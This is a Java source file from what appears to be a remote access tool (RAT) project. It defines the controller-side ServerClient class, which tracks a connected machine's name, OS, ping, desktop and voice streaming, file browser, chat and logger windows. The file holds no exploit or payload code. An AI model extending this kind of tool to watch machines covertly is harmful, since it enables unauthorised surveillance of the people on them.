/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.gui;

import javax.swing.ImageIcon;

import de.sogomn.engine.util.AbstractListenerContainer;
import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.util.Resources;

public final class ServerClient extends AbstractListenerContainer<IGuiController> implements IGuiController {
	
	private boolean loggedIn;
	
	private String name, os, version;
	private ImageIcon flag;
	private boolean streamingDesktop, streamingVoice;
	private long ping;
	
	final ActiveConnection connection;
	final IDisplayGui displayPanel;
	final IFileBrowserGui fileBrowser;
	final IChatGui chat;
	final ILoggingGui logger;
	
	ServerClient(final ActiveConnection connection, final IRattyGuiFactory guiFactory) {
		this.connection = connection;
		
		displayPanel = guiFactory.createDisplayGui();
		fileBrowser = guiFactory.createFileBrowserGui();
		chat = guiFactory.createChatGui();
		logger = guiFactory.createLoggingGui();
		
		displayPanel.setIcons(Resources.WINDOW_ICON_LIST);
		fileBrowser.setIcons(Resources.WINDOW_ICON_LIST);
		chat.setIcons(Resources.WINDOW_ICON_LIST);
		logger.setIcons(Resources.WINDOW_ICON_LIST);
	}
	
	@Override
	public void userInput(final String command, final Object source) {
		notifyListeners(controller -> controller.userInput(command, this));
	}
	
	public void logIn(final String name, final String os, final String version, final ImageIcon flag) {
		this.name = name;
		this.os = os;
		this.version = version;
		this.flag = flag;
		
		final String title = name + " " + getAddress();
		
		displayPanel.addListener(this);
		fileBrowser.addListener(this);
		chat.addListener(this);
		logger.addListener(this);
		displayPanel.setTitle(title);
		fileBrowser.setTitle(title);
		chat.setTitle(title);
		logger.setTitle(title);
		
		loggedIn = true;
	}
	
	public void logOut() {
		loggedIn = false;
		
		displayPanel.removeAllListeners();
		displayPanel.close();
		fileBrowser.removeAllListeners();
		fileBrowser.close();
		chat.removeAllListeners();
		chat.close();
		logger.removeAllListeners();
		logger.close();
	}
	
	public void setStreamingDesktop(final boolean streamingDesktop) {
		this.streamingDesktop = streamingDesktop;
	}
	
	public void setStreamingVoice(final boolean streamingVoice) {
		this.streamingVoice = streamingVoice;
	}
	
	public void setPing(final long ping) {
		this.ping = ping;
	}
	
	public String getName() {
		return name;
	}
	
	public ImageIcon getFlag() {
		return flag;
	}
	
	public String getAddress() {
		return connection.getAddress();
	}
	
	public String getOs() {
		return os;
	}
	
	public String getVersion() {
		return version;
	}
	
	public boolean isLoggedIn() {
		return loggedIn;
	}
	
	public boolean isStreamingDesktop() {
		return streamingDesktop;
	}
	
	public boolean isStreamingVoice() {
		return streamingVoice;
	}
	
	public long getPing() {
		return ping;
	}
	
	public String getPort() {
		final int port = connection.getLocalPort();
		
		return String.valueOf(port);
	}
	
}
